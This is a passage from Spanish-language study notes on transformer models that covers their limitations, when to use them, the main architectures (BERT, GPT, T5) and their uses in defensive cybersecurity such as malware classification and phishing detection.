2. DATOS DE ENTRENAMIENTO
   Necesitan MUCHOS datos para aprender bien
   BERT: 3.3B palabras, GPT-3: 300B tokens

3. COSTO COMPUTACIONAL
   GPT-3 175B parametros
   Entrenamiento: millones de dolares

4. CONTEXT WINDOW LIMITADO
   GPT-4: 8K-32K tokens
   Claude: 100K+ tokens
   Aun asi, limitado para documentos muy largos


CUANDO USAR TRANSFORMERS
========================

✓ Suficientes datos (>100K ejemplos)
✓ Secuencias medias (<4K tokens)
✓ Tareas de NLU/NLG
✓ Recursos computacionales adecuados
✓ Transfer learning posible

✗ Datos muy escasos
✗ Secuencias extremadamente largas
✗ Recursos limitados
✗ Requisitos de tiempo real estrictos
```

---

## Resumen

```
EVOLUCION: RNN → LSTM → Attention → Transformer → LLMs
======================================================

Key Innovations:
1. Self-Attention: O(1) path entre cualquier par de tokens
2. Multi-Head: Multiples tipos de relaciones
3. Positional Encoding: Informacion de orden
4. Parallelization: Entrenamiento eficiente

Arquitecturas:
├── Encoder-only (BERT): Clasificacion, embeddings
├── Decoder-only (GPT): Generacion de texto
└── Encoder-Decoder (T5): Seq2seq, traduccion

Aplicaciones Ciberseguridad:
├── Clasificacion malware (API calls, strings)
├── Analisis de logs (deteccion patrones)
├── Deteccion phishing (URLs, emails)
├── Embeddings de comandos (deteccion anomalias)
└── Threat intelligence (analisis reportes)
```

### Puntos Clave

1. **Attention** permite conexion directa entre cualquier par de tokens
2. **Multi-head** aprende diferentes tipos de relaciones
3. **Positional encoding** da informacion de orden
4. **Self-attention** es O(n²), limitante para secuencias largas
5. **Pre-training + fine-tuning** es el paradigma dominante
6. **BERT** para understanding, **GPT** para generation
7. En ciberseguridad: classification, anomaly detection, embeddings
